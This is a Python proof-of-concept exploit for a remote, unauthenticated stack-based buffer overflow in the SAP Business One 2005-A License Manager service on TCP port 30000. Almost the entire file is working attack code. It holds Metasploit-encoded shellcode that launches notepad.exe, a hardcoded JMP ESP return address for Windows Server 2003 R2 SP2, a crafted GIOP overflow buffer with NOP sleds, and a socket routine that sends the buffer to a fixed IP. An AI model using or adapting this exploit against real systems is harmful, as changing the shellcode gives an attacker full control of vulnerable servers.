#!/usr/bin/python
import socket, time


#########################################INFO################################################
# NT_Naming_Service.exe (License Manager 2005 for SAP Business One 2005-A) is               #
# vulnerable to a stack-based buffer overflow allowing for full system compromise by        #
# an unauthenticated user that has TCP/IP access to SAP's license service on TCP port 30000.#
# Mike Arnold ---> mikey27 .::at::. hotmail.com                                             #
############################################################################################


header = ("########################################################################\r\n"
"#    SAP Business One 2005-A License Manager remote overflow PoC    #\r\n"     
"#           Tested on 2005-A (6.80.123) SP:00 PL:06                 #\r\n"
"#                 2005-A (6.80.320) SP:01 PL:34                 #\r\n"
"#              OS: Windows Server 2003 R2 Std/Ent Service Pack 2      #\r\n"
"#             Coded by Bruk0ut - mikey27 .::at::. hotmail.com       #\r\n"
"########################################################################\r\n")


#metasploit windows/exec - notepad.exe x86/shikata_ga_nai 152 bytes
sc = ("\xbf\xd6\x21\x7d\x3b\xda\xdb\xd9\x74\x24\xf4\x33\xc9\x5d\xb1"
"\x20\x31\x7d\x13\x83\xc5\x04\x03\x7d\xd9\xc3\x88\xc7\x0d\x47"
"\x73\x38\xcd\xc3\x36\x04\x46\xaf\xbd\x0c\x59\xbf\x35\xa3\x41"
"\xb4\x15\x1c\x70\x21\xe0\xd7\x46\x3e\xf2\x09\x97\x80\x6c\x79"
"\x53\xc0\xfb\x85\x9a\x0b\x0e\x8b\xde\x67\xe5\xb0\x8a\x53\x02"
"\xb2\xd7\x17\x55\x18\x16\xc3\x0c\xeb\x14\x58\x5a\xb4\x38\x5f"
"\xb7\xc0\x5c\xd4\x46\x3c\xd5\xb6\x6c\xc6\x26\x19\x5c\x30\xc8"
"\xf0\xfa\x37\x4e\xcd\x89\x08\x42\xa6\xfe\x94\xf7\x33\x96\xac"
"\x8e\xbc\xe4\x6d\xfa\x6c\x83\x9d\x70\x88\x0c\x36\x1c\x6f\x38"
"\xc8\x4b\x6f\xda\xbb\x1c\xfb\x40\x34\x83\x67\xa5\xd1\x3b\x0d"
"\xb9\x13")

#JMP ESP 0x773a73fb User32.dll - Server2k3 R2 STD/ENT - SP2
ret = '\xfb\x73\x3a\x77'
giop_header = '\x47\x49\x4f\x50\x01\x00\x01\x00'
buff = giop_header + '\x2f\x5c' * 500 + "A" * 24 + ret + '\x90' * 44 + sc + '\x90' * 384

print (header)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect (('10.0.0.241',30000))
s.setblocking(0)

s.send(buff)
time.sleep(1)
print ("done!")

s.close()

